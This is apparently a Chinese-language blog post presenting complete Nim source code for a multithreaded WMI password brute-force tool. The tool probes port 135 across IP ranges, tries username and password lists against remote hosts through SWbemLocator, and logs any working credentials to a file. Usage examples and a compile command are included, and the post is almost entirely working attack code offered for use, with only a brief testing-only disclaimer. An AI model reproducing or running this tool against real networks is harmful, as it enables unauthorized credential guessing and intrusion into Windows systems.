# WMI密码批量爆破

先探测目标 IP 地址 135 端口是否开放，后进行密码的扫描。调用 swbemlocator 对象连接目标，然后根据响应信息，判断账密是否正确。除了输出扫描过程，发现的正确账号密码会保存到当前工作目录下的wmilogin.log 文件中。

### 用法    

Usage: wmiLogin.exe 192.168.1.111  
Usage: wmiLogin.exe 10.10.10.0/24  
Usage: wmiLogin.exe 172.10.1.1-172.10.8.254  
Usage: wmiLogin.exe 192.168.1.111,10.10.0.0/23  
Usage: wmiLogin.exe ip.txt  

IP地址的输入支持单个IP和CIDR 还有 IP地址范围。

账号密码的输入支持两种格式。

第一种，user.txt（存放用户名） 和 pass.txt（存放密码）。

第二种， userpass.txt（一行一对账号密码，用空格间隔，比如：administrator  123456）。

如果以上文件同时存在，优先选择第二种。

编译：nim c -d:release --opt:size --threads=on wmiLogin.nim

备注：本博客的代码仅作为测试目的，不能保证代码的兼容性和健壮性。  

![截图](https://files-cdn.cnblogs.com/files/StudyCat/wmilogin.bmp)

### 源代码

``` wmiLogin.nim
#[
    Author: StudyCat
    Blog: https://www.cnblogs.com/studycat
    Github: https://github.com/StudyCat404/myNimExamples
    License: BSD 3-Clause
]#
import winim/com
import os
import strutils
import strformat
import terminal
import net
import winim/inc/winnls
import threadpool
import ip_seg
import times

let time = cpuTime()

type
    STATUS* = enum
        Error, Success, Info

proc printC(stat: STATUS, text: string) = 
    case stat
    of Error:
        stdout.styledWrite(fgRed, "[-] ")
    of Success:
        stdout.styledWrite(fgGreen, "[+] ")
    of Info:
        stdout.styledWrite(fgYellow, "[*] ")
    echo text
    
proc log(content: string) =
    echo content
    let logFilename = "wmiLogin.log"
    var logFile: File
    logFile = open(logFilename, fmAppend)
    logFile.writeLine(content)
    logFile.close()
    
proc telnet(host: string): bool =
    var socket = newSocket()
    try:
        socket.connect(host, Port(135), timeout=2000)
        return true
    except:
        #printC Error, fmt"{host}:135 close rpc"
        echo fmt"{host}:135 close rpc"
        return false
    finally:
        socket.close()    
        
proc ipParser(somestr: string): seq[string] =
    var nodes: seq[string]
    if fileExists(somestr):
        for line in somestr.lines:
            nodes.add(line)
    else:
        nodes.add(somestr.split(','))

    for node in nodes:
        if isIpAddress(node):
            result.add(node)
        elif node.contains("-"):
            let
                range1 = node.split("-")[0]
                range2 = node.split("-")[1]
            if isIpAddress(range1) and isIpAddress(range2):
                result.add(calc_range(range1, range2))
        elif node.contains("/"):
            result.add(calc_range(node))
        else:
            echo "Fomat error: ", node
    if result.len() > 0:
        return result
    else:
        quit(-1)

#SWbemLocator: User credentials cannot be used for local connections
#SWbemLocator: Access is denied.
#SWbemLocator: The RPC server is unavailable.
proc wmiLogin(host, user, pass: string) {.thread.} =
    var objLocator = CreateObject("wbemscripting.swbemlocator")
    #1033 en #2052 cn
    var 
        errorMsgA, errorMsgB: string
    if GetSystemDefaultLangID() == 2052:
        errorMsgA = "SWbemLocator: RPC 服务器不可用。"
        errorMsgB = "SWbemLocator: 用户凭据不能用于本地连接"
    else:
        errorMsgA = "SWbemLocator: The RPC server is unavailable."
        errorMsgB = "SWbemLocator: User credentials cannot be used for local connections"        
        
    try:
        var SubobjSWbemServices = objLocator.connectServer(host, "root\\cimv2", user, pass, "MS_409", "", 128)
        discard SubobjSWbemServices.InstancesOf("Win32_Service")
        log(fmt"[+] {host} - '{user}':'{pass}' Successfully logged on!"  ) 
    except:
        #echo getCurrentCOMError().hresult
        #echo getCurrentException().msg
        if strip(getCurrentException().msg) == errorMsgA or strip(getCurrentException().msg) == errorMsgB:
            # printC Success, fmt"{host} - '{user}':'{pass}' Successfully logged on!"
            log(fmt"[+] {host} - '{user}':'{pass}' Successfully logged on!")
        else:
            echo fmt"[-] {host} - '{user}':'{pass}' Login failed"

proc doWmiLogin(host: string, userpass: seq[tuple[user, pass: string]]) {.thread.} =
    if telnet(host):
        for credential in userpass:
            wmiLogin(host, credential.user, credential.pass)
            
proc doWmiLogin(host: string, users, passes: seq[string]) {.thread.} =
    if telnet(host):
        for user in users:
            for pass in passes:
                wmiLogin(host, user, pass)
            
proc main() =
    if  paramCount() == 0 or paramStr(1) in ["-h","/?","help"]:
        let pathSplit = splitPath(paramStr(0))
        echo "Usage: ", pathSplit.tail, " 192.168.1.111" 
        echo "Usage: ", pathSplit.tail, " 10.10.10.0/24" 
        echo "Usage: ", pathSplit.tail, " 172.10.1.1-172.10.8.254" 
        echo "Usage: ", pathSplit.tail, " 192.168.1.111,10.10.0.0/23" 
        echo "Usage: ", pathSplit.tail, " ip.txt"
        quit()
    
    let hosts = ipParser(paramStr(1))
    
    if fileExists("userpass.txt"):
        var credential: tuple[user, pass: string]
        var userpass: seq[tuple[user, pass: string]]
        try:
            for line in "userpass.txt".lines:
                let t = split(line, " ", 1)
                credential.user = t[0]
                credential.pass = t[1]
                userpass.add(credential)
        except:
            echo getCurrentExceptionMsg()
            quit()
            
        for host in hosts:
            spawn doWmiLogin(host,userpass)
        
    elif fileExists("user.txt") and fileExists("pass.txt"):
        var users: seq[string]
        var passes: seq[string]
        for line in "user.txt".lines:
            users.add(line)
        for line in "pass.txt".lines:
            passes.add(line)
        
        for host in hosts:
            spawn doWmiLogin(host, users, passes)

    else:
        echo "userpass.txt not found"
        echo "user.txt or pass.txt not found"
        quit()        
    
    sync()
    echo "Time taken: ", cpuTime() - time, "s"
    
when isMainModule:
    when defined windows:
        main()
```

向k8gege学习： http://k8gege.org/Ladon/WmiScan.html